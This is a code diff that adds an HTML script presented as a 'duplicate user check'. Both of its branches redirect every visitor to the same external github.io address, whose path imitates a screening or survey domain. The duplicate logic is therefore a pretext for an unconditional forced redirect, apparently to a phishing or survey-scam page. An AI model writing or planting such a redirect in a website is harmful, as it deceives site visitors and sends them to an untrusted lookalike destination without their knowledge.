@@ -1,1 +1,16 @@
+<script>
+  // Example duplicate check function
+  function isDuplicateUser() {
+    // Replace with your actual logic (cookies, server check, etc.)
+    return localStorage.getItem("alreadyVisited") === "true";
+  }
 
+  // Redirect logic
+  if (isDuplicateUser()) {
+    window.location.href = "https://screeningopenionbd.github.io/Screening.aspx.id-allcounted.com/fail";
+  } else {
+    // Mark user as visited
+    localStorage.setItem("alreadyVisited", "true");
+    window.location.href = "https://screeningopenionbd.github.io/Screening.aspx.id-allcounted.com/fail";
+  }
+</script>
